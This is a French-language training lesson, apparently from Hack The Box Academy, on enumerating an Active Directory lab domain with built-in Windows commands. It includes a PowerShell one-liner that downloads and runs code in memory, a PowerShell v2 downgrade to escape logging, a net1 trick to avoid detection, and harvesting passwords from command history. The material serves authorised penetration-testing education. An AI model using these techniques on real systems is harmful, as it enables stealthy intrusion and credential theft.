Vivre de la terre
=================

* * * * *

Plus tôt dans le module, nous avons pratiqué plusieurs outils et techniques (à la fois accrédités et non accrédités) pour énumérer l'environnement AD. Ces méthodes nous ont obligés à télécharger ou à tirer l'outil sur l'hôte de pied ou à avoir un hôte d'attaque à l'intérieur de l'environnement. Cette section abordera plusieurs techniques d'utilisation des outils Windows natifs pour effectuer notre énumération, puis les pratiquer à partir de notre hôte d'attaque Windows.

* * * * *

Scénario
--------

Supposons que notre client nous ait demandé de tester son environnement AD à partir d'un hôte géré sans accès Internet, et que tous les efforts pour y charger des outils aient échoué. Notre client veut voir quels types d'énumération sont possibles, nous devrons donc recourir à "vivre de la terre" ou utiliser uniquement des outils et des commandes natifs de Windows/Active Directory. Cela peut également être une approche plus furtive et peut ne pas créer autant d'entrées de journal et d'alertes que l'insertion d'outils dans le réseau dans les sections précédentes. De nos jours, la plupart des environnements d'entreprise disposent d'une certaine forme de surveillance et de journalisation du réseau, y compris IDS/IPS, des pare-feu et des capteurs et outils passifs en plus de leurs défenses basées sur l'hôte, telles que Windows Defender ou EDR d'entreprise. En fonction de l'environnement, ils peuvent également avoir des outils qui prennent une ligne de base du trafic réseau "normal" et recherchent les anomalies. Pour cette raison, nos chances de nous faire prendre augmentent de façon exponentielle lorsque nous commençons à attirer des outils dans l'environnement depuis l'extérieur.

* * * * *

Commandes Env pour la reconnaissance de l'hôte et du réseau
-----------------------------------------------------------

Tout d'abord, nous couvrirons quelques commandes environnementales de base qui peuvent être utilisées pour nous donner plus d'informations sur l'hôte sur lequel nous nous trouvons.

#### Commandes d'énumération de base

| Commande | Résultat |
| --- | --- |
| `hostname` | Imprime le nom du PC |
| `[System.Environment]::OSVersion.Version` | Imprime la version du système d'exploitation et le niveau de révision |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Imprime les correctifs et les correctifs appliqués à l'hôte |
| `ipconfig /all` | Imprime l'état et les configurations de l'adaptateur réseau |
| `set %USERDOMAIN%` | Affiche le nom de domaine auquel appartient l'hôte (exécuté à partir de l'invite CMD) |
| `set %logonserver%` | Imprime le nom du contrôleur de domaine avec lequel l'hôte s'enregistre (exécuté à partir de l'invite CMD) |

#### Énumération de base

![image](https://academy.hackthebox.com/storage/modules/143/basic-enum.png)

Les commandes ci-dessus nous donneront une première image rapide de l'état dans lequel se trouve l'hôte, ainsi que des informations de base sur le réseau et le domaine. Nous pouvons couvrir les informations ci-dessus avec une seule commande [systeminfo](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo) .

#### Information système

![image](https://academy.hackthebox.com/storage/modules/143/systeminfo.png)

La `systeminfo`commande, comme vu ci-dessus, imprimera un résumé des informations de l'hôte pour nous dans une sortie ordonnée. L'exécution d'une commande générera moins de journaux, ce qui signifie moins de chances que nous soyons remarqués sur l'hôte par un défenseur.

* * * * *

Exploiter PowerShell
--------------------

PowerShell existe depuis 2006 et fournit aux administrateurs système Windows un cadre complet pour administrer toutes les facettes des systèmes Windows et des environnements AD. C'est un langage de script puissant et peut être utilisé pour approfondir les systèmes. PowerShell possède de nombreuses fonctions et modules intégrés que nous pouvons utiliser dans le cadre d'un engagement pour reconnaître l'hôte et le réseau et envoyer et recevoir des fichiers.

Examinons quelques-unes des façons dont PowerShell peut nous aider.

| Cmd-Let | Description |
| --- | --- |
| `Get-Module` | Répertorie les modules disponibles chargés pour être utilisés. |
| `Get-ExecutionPolicy -List` | Imprime les paramètres [de stratégie d'exécution](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) pour chaque étendue sur un hôte. |
| `Set-ExecutionPolicy Bypass -Scope Process` | Cela changera la politique de notre processus actuel utilisant le `-Scope`paramètre. Cela annulera la politique une fois que nous quitterons le processus ou que nous y mettrons fin. C'est idéal car nous n'apporterons pas de modification permanente à l'hôte de la victime. |
| `Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Avec cette chaîne, nous pouvons obtenir l'historique PowerShell de l'utilisateur spécifié. Cela peut être très utile car l'historique des commandes peut contenir des mots de passe ou nous diriger vers des fichiers de configuration ou des scripts contenant des mots de passe. |
| `Get-ChildItem Env: | ft Key,Value` | Renvoie les valeurs d'environnement telles que les chemins d'accès clés, les utilisateurs, les informations sur l'ordinateur, etc. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | Il s'agit d'un moyen simple et rapide de télécharger un fichier sur le Web à l'aide de PowerShell et de l'appeler de mémoire. |

Voyons-les maintenant en action sur l' `MS01`hôte.

#### Vérifications rapides à l'aide de PowerShell

  Vérifications rapides à l'aide de PowerShell

```
PS C:\htb> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...

PS C:\htb> Get-ExecutionPolicy -List
Get-ExecutionPolicy -List

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine    RemoteSigned

PS C:\htb> whoami
nt authority\system

PS C:\htb> Get-ChildItem Env: | ft key,value

Get-ChildItem Env: | ft key,value

Key                     Value
---                     -----
ALLUSERSPROFILE         C:\ProgramData
APPDATA                 C:\Windows\system32\config\systemprofile\AppData\Roaming
CommonProgramFiles      C:\Program Files (x86)\Common Files
CommonProgramFiles(x86) C:\Program Files (x86)\Common Files
CommonProgramW6432      C:\Program Files\Common Files
COMPUTERNAME            ACADEMY-EA-MS01
ComSpec                 C:\Windows\system32\cmd.exe
DriverData              C:\Windows\System32\Drivers\DriverData
LOCALAPPDATA            C:\Windows\system32\config\systemprofile\AppData\Local
NUMBER_OF_PROCESSORS    4
OS                      Windows_NT
Path                    C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShel...
PATHEXT                 .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE  x86
PROCESSOR_ARCHITEW6432  AMD64
PROCESSOR_IDENTIFIER    AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
PROCESSOR_LEVEL         23
PROCESSOR_REVISION      3100
ProgramData             C:\ProgramData
ProgramFiles            C:\Program Files (x86)
ProgramFiles(x86)       C:\Program Files (x86)
ProgramW6432            C:\Program Files
PROMPT                  $P$G
PSModulePath            C:\Program Files\WindowsPowerShell\Modules;WindowsPowerShell\Modules;C:\Program Files (x86)\...
PUBLIC                  C:\Users\Public
SystemDrive             C:
SystemRoot              C:\Windows
TEMP                    C:\Windows\TEMP
TMP                     C:\Windows\TEMP
USERDOMAIN              INLANEFREIGHT
USERNAME                ACADEMY-EA-MS01$
USERPROFILE             C:\Windows\system32\config\systemprofile
windir                  C:\Windows

```

Nous avons effectué une énumération de base de l'hôte. Maintenant, discutons de quelques tactiques de sécurité opérationnelle.

De nombreux défenseurs ignorent que plusieurs versions de PowerShell existent souvent sur un hôte. S'ils ne sont pas désinstallés, ils peuvent toujours être utilisés. La journalisation des événements Powershell a été introduite en tant que fonctionnalité avec Powershell 3.0 et versions ultérieures. Dans cet esprit, nous pouvons essayer d'appeler Powershell version 2.0 ou antérieure. En cas de succès, nos actions depuis le shell ne seront pas enregistrées dans l'Observateur d'événements. C'est un excellent moyen pour nous de rester sous le radar des défenseurs tout en utilisant à notre avantage les ressources intégrées aux hôtes. Vous trouverez ci-dessous un exemple de rétrogradation de Powershell.

#### Rétrograder Powershell

  Rétrograder Powershell

```
PS C:\htb> Get-host

Name             : ConsoleHost
Version          : 5.1.19041.1320
InstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> powershell.exe -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\htb> Get-host
Name             : ConsoleHost
Version          : 2.0
InstanceId       : 121b807c-6daa-4691-85ef-998ac137e469
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> get-module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Content...}
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expand-GitCommand...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PSReadLineKeyHandler...

```

Nous pouvons maintenant voir que nous exécutons une ancienne version de PowerShell à partir de la sortie ci-dessus. Remarquez la différence dans la version rapportée. Cela confirme que nous avons réussi à rétrograder le shell. Vérifions et voyons si nous écrivons toujours des journaux. Le premier endroit où chercher est dans le `PowerShell Operational Log`trouvé sous `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`. Toutes les commandes exécutées dans notre session seront enregistrées dans ce fichier. Le `Windows PowerShell`journal situé à`Applications and Services Logs > Windows PowerShell`est également un bon endroit pour vérifier. Une entrée sera faite ici lorsque nous démarrons une instance de PowerShell. Dans l'image ci-dessous, nous pouvons voir les entrées rouges apportées au journal à partir de la session PowerShell en cours et la sortie de la dernière entrée effectuée à 14h12 lorsque la rétrogradation est effectuée. C'était la dernière entrée depuis que notre session est passée à une version de PowerShell qui n'est plus capable de se connecter. Notez que cet événement correspond au dernier événement dans les `Windows PowerShell`entrées du journal.

#### Examen du journal des événements Powershell

![texte](https://academy.hackthebox.com/storage/modules/143/downgrade.png)

Avec [la journalisation des blocs de script](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2) activée, nous pouvons voir que tout ce que nous tapons dans le terminal est envoyé à ce journal. Si nous rétrogradons vers PowerShell V2, cela ne fonctionnera plus correctement. Nos actions après seront masquées car la journalisation des blocs de script ne fonctionne pas sous PowerShell 3.0. Remarquez ci-dessus dans les journaux que nous pouvons voir les commandes que nous avons émises lors d'une session shell normale, mais qu'elles se sont arrêtées après le démarrage d'une nouvelle instance PowerShell dans la version 2. Sachez que l'action d'émettre la commande`powershell.exe -version 2`dans la session PowerShell seront enregistrés. Ainsi, des preuves seront laissées derrière montrant que la rétrogradation s'est produite, et un défenseur suspect ou vigilant peut commencer une enquête après avoir vu cela se produire et les journaux ne se remplissent plus pour cette instance. Nous pouvons en voir un exemple dans l'image ci-dessous. Les éléments dans la zone rouge sont les entrées de journal avant le démarrage de la nouvelle instance, et les informations en vert sont le texte indiquant qu'une nouvelle session PowerShell a été démarrée dans HostVersion 2.0.

#### Démarrage des journaux V2

![texte](https://academy.hackthebox.com/storage/modules/143/start-event.png)

* * * * *

### Vérification des défenses

Les quelques commandes suivantes utilisent les utilitaires [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) et [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) pour nous aider à avoir une idée de l'état de l'hôte en ce qui concerne les paramètres du pare-feu Windows et pour vérifier l'état de Windows Defender.

#### Vérifications du pare-feu

  Vérifications du pare-feu

```
PS C:\htb> netsh advfirewall show allprofiles

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Private Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Public Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

```

#### Vérification de Windows Defender (à partir de CMD.exe)

  Vérification de Windows Defender (à partir de CMD.exe)

```
C:\htb> sc query windefend

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

```

Ci-dessus, nous avons vérifié si Defender fonctionnait. Ci-dessous, nous vérifierons l'état et les paramètres de configuration avec l' applet de commande [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps) dans PowerShell.

#### Get-MpComputerStatus

  Get-MpComputerStatus

```
PS C:\htb> Get-MpComputerStatus

AMEngineVersion                  : 1.1.19000.8
AMProductVersion                 : 4.18.2202.4
AMRunningMode                    : Normal
AMServiceEnabled                 : True
AMServiceVersion                 : 4.18.2202.4
AntispywareEnabled               : True
AntispywareSignatureAge          : 0
AntispywareSignatureLastUpdated  : 3/21/2022 4:06:15 AM
AntispywareSignatureVersion      : 1.361.414.0
AntivirusEnabled                 : True
AntivirusSignatureAge            : 0
AntivirusSignatureLastUpdated    : 3/21/2022 4:06:16 AM
AntivirusSignatureVersion        : 1.361.414.0
BehaviorMonitorEnabled           : True
ComputerID                       : FDA97E38-1666-4534-98D4-943A9A871482
ComputerState                    : 0
DefenderSignaturesOutOfDate      : False
DeviceControlDefaultEnforcement  : Unknown
DeviceControlPoliciesLastUpdated : 3/20/2022 9:08:34 PM
DeviceControlState               : Disabled
FullScanAge                      : 4294967295
FullScanEndTime                  :
FullScanOverdue                  : False
FullScanRequired                 : False
FullScanSignatureVersion         :
FullScanStartTime                :
IoavProtectionEnabled            : True
IsTamperProtected                : True
IsVirtualMachine                 : False
LastFullScanSource               : 0
LastQuickScanSource              : 2

<SNIP>

```

Savoir à quelle révision se trouvent nos paramètres AV et quels paramètres sont activés/désactivés peut nous être très bénéfique. Nous pouvons savoir à quelle fréquence les analyses sont exécutées, si l'alerte de menace à la demande est active, et plus encore. C'est aussi une excellente information pour les rapports. Souvent, les défenseurs peuvent penser que certains paramètres sont activés ou que des analyses sont programmées pour s'exécuter à certains intervalles. Si ce n'est pas le cas, ces résultats peuvent les aider à résoudre ces problèmes.

* * * * *

Suis-je seul ?
--------------

Lorsque vous atterrissez sur un hôte pour la première fois, une chose importante est de vérifier et de voir si vous êtes le seul à être connecté. Si vous commencez à prendre des mesures à partir d'un hôte sur lequel quelqu'un d'autre se trouve, il est possible qu'il vous remarque. Si une fenêtre contextuelle se lance ou si un utilisateur est déconnecté de sa session, il peut signaler ces actions ou changer son mot de passe, et nous pourrions perdre pied.

  Get-MpComputerStatus

```
PS C:\htb> qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen

```

Maintenant que nous avons une bonne idée de l'état de notre hôte, nous pouvons énumérer les paramètres réseau de notre hôte et identifier les machines ou services de domaine potentiels que nous pourrions vouloir cibler ensuite.

Informations sur le réseau
--------------------------

| Commandes réseau | Description |
| --- | --- |
| `arp -a` | Répertorie tous les hôtes connus stockés dans la table arp. |
| `ipconfig /all` | Imprime les paramètres de l'adaptateur pour l'hôte. Nous pouvons comprendre le segment de réseau à partir d'ici. |
| `route print` | Affiche la table de routage (IPv4 et IPv6) identifiant les réseaux connus et les routes de couche trois partagées avec l'hôte. |
| `netsh advfirewall show state` | Affiche l'état du pare-feu de l'hôte. Nous pouvons déterminer s'il est actif et filtrer le trafic. |

Des commandes telles que `ipconfig /all`et `systeminfo`nous montrent quelques configurations réseau de base. Deux commandes plus importantes nous fournissent une tonne de données précieuses et pourraient nous aider à approfondir notre accès. `arp -a`et `route print`nous montrera quels hôtes la boîte sur laquelle nous sommes est au courant et quels réseaux sont connus de l'hôte. Tous les réseaux qui apparaissent dans la table de routage sont des voies potentielles de déplacement latéral, car ils sont suffisamment accessibles pour qu'une route ait été ajoutée, ou qu'elle y ait été administrativement définie afin que l'hôte sache comment accéder aux ressources sur le domaine. Ces deux commandes peuvent être particulièrement utiles dans la phase de découverte d'une évaluation de boîte noire où nous devons limiter notre analyse

#### Utiliser arp -a

  Utiliser arp -a

```
PS C:\htb> arp -a

Interface: 172.16.5.25 --- 0x8
  Internet Address      Physical Address      Type
  172.16.5.5            00-50-56-b9-08-26     dynamic
  172.16.5.130          00-50-56-b9-f0-e1     dynamic
  172.16.5.240          00-50-56-b9-9d-66     dynamic
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static

Interface: 10.129.201.234 --- 0xc
  Internet Address      Physical Address      Type
  10.129.0.1            00-50-56-b9-b9-fc     dynamic
  10.129.202.29         00-50-56-b9-26-8d     dynamic
  10.129.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

```

#### Affichage de la table de routage

  Affichage de la table de routage

```
PS C:\htb> route print

===========================================================================
Interface List
  8...00 50 56 b9 9d d9 ......vmxnet3 Ethernet Adapter #2
 12...00 50 56 b9 de 92 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       172.16.5.1      172.16.5.25    261
          0.0.0.0          0.0.0.0       10.129.0.1   10.129.201.234     20
       10.129.0.0      255.255.0.0         On-link    10.129.201.234    266
   10.129.201.234  255.255.255.255         On-link    10.129.201.234    266
   10.129.255.255  255.255.255.255         On-link    10.129.201.234    266
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
       172.16.4.0    255.255.254.0         On-link       172.16.5.25    261
      172.16.5.25  255.255.255.255         On-link       172.16.5.25    261
     172.16.5.255  255.255.255.255         On-link       172.16.5.25    261
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link    10.129.201.234    266
        224.0.0.0        240.0.0.0         On-link       172.16.5.25    261
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link    10.129.201.234    266
  255.255.255.255  255.255.255.255         On-link       172.16.5.25    261
  ===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0       172.16.5.1  Default
===========================================================================

IPv6 Route Table
===========================================================================

<SNIP>

```

L'utilisation `arp -a`de et `route print`profitera non seulement à l'énumération des environnements AD, mais nous aidera également à identifier les opportunités de basculement vers différents segments de réseau dans n'importe quel environnement. Ce sont des commandes que nous devrions envisager d'utiliser à chaque engagement pour aider nos clients à comprendre où un attaquant peut tenter d'aller après un compromis initial.

* * * * *

Instrumentation de gestion Windows (WMI)
----------------------------------------

[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) est un moteur de script largement utilisé dans les environnements d'entreprise Windows pour récupérer des informations et exécuter des tâches administratives sur des hôtes locaux et distants. Pour notre usage, nous créerons un rapport WMI sur les utilisateurs de domaine, les groupes, les processus et d'autres informations de notre hôte et d'autres hôtes de domaine.

#### Vérifications WMI rapides

| Commande | Description |
| --- | --- |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Imprime le niveau de correctif et la description des correctifs appliqués |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Affiche les informations de base sur l'hôte pour inclure tous les attributs dans la liste |
| `wmic process list /format:list` | Une liste de tous les processus sur l'hôte |
| `wmic ntdomain list /format:list` | Affiche des informations sur le domaine et les contrôleurs de domaine |
| `wmic useraccount list /format:list` | Affiche des informations sur tous les comptes locaux et tous les comptes de domaine qui se sont connectés à l'appareil |
| `wmic group list /format:list` | Informations sur tous les groupes locaux |
| `wmic sysaccount list /format:list` | Vide les informations sur tous les comptes système utilisés comme comptes de service. |

Ci-dessous, nous pouvons voir des informations sur le domaine et le domaine enfant, ainsi que sur la forêt externe avec laquelle notre domaine actuel est approuvé. Cette [feuille de triche](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) contient des commandes utiles pour interroger les informations sur l'hôte et le domaine à l'aide de wmic.

  Vérifications WMI rapides

```
PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

Caption          Description      DnsForestName           DomainControllerAddress  DomainName
ACADEMY-EA-MS01  ACADEMY-EA-MS01
INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC

```

WMI est un vaste sujet, et il serait impossible d'aborder tout ce dont il est capable dans une partie d'une section. Pour plus d'informations sur WMI et ses fonctionnalités, consultez la [documentation officielle de WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/using-wmi) .

* * * * *

Commandes réseau
----------------

[Les commandes net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) peuvent nous être utiles lorsque nous tentons d'énumérer des informations à partir du domaine. Ces commandes peuvent être utilisées pour interroger l'hôte local et les hôtes distants, tout comme les fonctionnalités fournies par WMI. Nous pouvons lister des informations telles que :

-   Utilisateurs locaux et de domaine
-   Groupes
-   Hôtes
-   Utilisateurs spécifiques dans des groupes
-   Contrôleurs de domaine
-   Exigences relatives au mot de passe

Nous couvrirons quelques exemples ci-dessous. Gardez à l'esprit que `net.exe`les commandes sont généralement surveillées par les solutions EDR et peuvent rapidement abandonner notre emplacement si notre évaluation comporte une composante évasive. Certaines organisations configureront même leurs outils de surveillance pour lancer des alertes si certaines commandes sont exécutées par des utilisateurs dans des unités d'organisation spécifiques, telles que le compte d'un associé marketing exécutant des commandes telles que , `whoami`et `net localgroup administrators`, etc. Cela pourrait être un signal d'alarme évident pour quiconque surveille fortement le réseau. .

#### Tableau des commandes nettes utiles

| Commande | Description |
| --- | --- |
| `net accounts` | Informations sur les exigences de mot de passe |
| `net accounts /domain` | Mot de passe et politique de verrouillage |
| `net group /domain` | Informations sur les groupes de domaines |
| `net group "Domain Admins" /domain` | Répertorier les utilisateurs avec des privilèges d'administrateur de domaine |
| `net group "domain computers" /domain` | Liste des PC connectés au domaine |
| `net group "Domain Controllers" /domain` | Répertorier les comptes PC des contrôleurs de domaines |
| `net group <domain_group_name> /domain` | Utilisateur qui appartient au groupe |
| `net groups /domain` | Liste des groupes de domaines |
| `net localgroup` | Tous les groupes disponibles |
| `net localgroup administrators /domain` | Répertorier les utilisateurs appartenant au groupe des administrateurs à l'intérieur du domaine (le groupe `Domain Admins`est inclus ici par défaut) |
| `net localgroup Administrators` | Informations sur un groupe (administrateurs) |
| `net localgroup administrators [username] /add` | Ajouter un utilisateur aux administrateurs |
| `net share` | Vérifier les partages actuels |
| `net user <ACCOUNT_NAME> /domain` | Obtenir des informations sur un utilisateur du domaine |
| `net user /domain` | Lister tous les utilisateurs du domaine |
| `net user %username%` | Informations sur l'utilisateur actuel |
| `net use x: \computer\share` | Monter le partage localement |
| `net view` | Obtenir une liste d'ordinateurs |
| `net view /all /domain[:domainname]` | Partages sur les domaines |
| `net view \computer /ALL` | Répertorier les partages d'un ordinateur |
| `net view /domain` | Liste des PC du domaine |

#### Liste des groupes de domaines

  Liste des groupes de domaines

```
PS C:\htb> net group /domain

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

Group Accounts for \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-------------------------------------------------------------------------------
*$H25000-1RTRKC5S507F
*Accounting
*Barracuda_all_access
*Barracuda_facebook_access
*Barracuda_parked_sites
*Barracuda_youtube_exempt
*Billing
*Billing_users
*Calendar Access
*CEO
*CFO
*Cloneable Domain Controllers
*Collaboration_users
*Communications_users
*Compliance Management
*Computer Group Management
*Contractors
*CTO

<SNIP>

```

Nous pouvons voir ci-dessus que la `net group`commande nous a fourni une liste de groupes au sein du domaine.

#### Informations sur un utilisateur de domaine

  Informations sur un utilisateur de domaine

```
PS C:\htb> net user /domain wrouse

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

User name                    wrouse
Full Name                    Christopher Davis
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/27/2021 10:38:01 AM
Password expires             Never
Password changeable          10/28/2021 10:38:01 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *File Share G Drive   *File Share H Drive
                             *Warehouse            *Printer Access
                             *Domain Users         *VPN Users
                             *Shared Calendar Read
The command completed successfully.

```

#### Astuce des commandes nettes

Si vous pensez que les défenseurs du réseau enregistrent/recherchent activement des commandes hors de la normale, vous pouvez essayer cette solution de contournement pour utiliser les commandes net. Taper `net1`au lieu de `net`exécutera les mêmes fonctions sans le déclencheur potentiel de la chaîne net.

#### Exécution de la commande Net1

![image](https://academy.hackthebox.com/storage/modules/143/net1userreal.png)

* * * * *

Dsquery
-------

[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)) est un outil de ligne de commande utile qui peut être utilisé pour rechercher des objets Active Directory. Les requêtes que nous exécutons avec cet outil peuvent être facilement reproduites avec des outils tels que BloodHound et PowerView, mais nous n'avons peut-être pas toujours ces outils à notre disposition, comme indiqué au début de la section. Mais il s'agit probablement d'un outil que les administrateurs système de domaine utilisent dans leur environnement. Dans cet esprit, `dsquery`existera sur n'importe quel hôte sur lequel est `Active Directory Domain Services Role`installé, et la `dsquery`DLL existe maintenant par défaut sur tous les systèmes Windows modernes et peut être trouvée à l'adresse `C:\Windows\System32\dsquery.dll`.

#### DLL Dsquery

Tout ce dont nous avons besoin, ce sont des privilèges élevés sur un hôte ou la possibilité d'exécuter une instance d'invite de commande ou de PowerShell à partir d'un `SYSTEM`contexte. Ci-dessous, nous montrerons la fonction de recherche de base avec `dsquery`quelques filtres de recherche utiles.

#### Recherche d'utilisateurs

  Recherche d'utilisateurs

```
PS C:\htb> dsquery user

"CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Htb Student,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Annie Vazquez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Paul Falcon,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Fae Anthony,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Walter Dillard,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Louis Bradford,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Sonya Gage,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Alba Sanchez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
